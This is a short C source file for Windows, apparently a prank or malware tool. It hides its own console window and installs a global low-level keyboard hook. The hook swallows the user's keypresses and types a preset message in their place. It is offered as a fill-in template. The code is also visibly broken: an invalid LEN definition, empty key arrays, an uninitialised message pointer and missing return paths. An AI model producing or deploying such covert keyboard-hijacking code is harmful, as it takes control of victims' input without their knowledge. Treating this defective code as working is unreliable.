#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#define LEN ? // add message's len
HHOOK hook;
LPMSG msg;

int key[] = { }; // add the keys u want to be written
int scan[] = { }; // add the keys' scan code

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    static int index = 0;
    if (code == HC_ACTION)
    {
        if (wParam == WM_KEYDOWN)
        {
            if (*(char*)lParam == key[index])
            {
                index++;
                return CallNextHookEx(hook, code, wParam, lParam);
            }
            
            keybd_event(key[index],
                scan[index],
                KEYEVENTF_EXTENDEDKEY | 0,
                0);

            keybd_event(key[index],
                scan[index],
                KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,
                0); 

            index = index % LEN;
            return 1;
        }
    }    
}

int main()
{
    Stealth();
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hook != NULL)
        puts("All is good");
    else
        puts("Something went wrong :(");
    
    while (GetMessage(msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(msg);
        DispatchMessage(msg);
    }
    return 0;
}
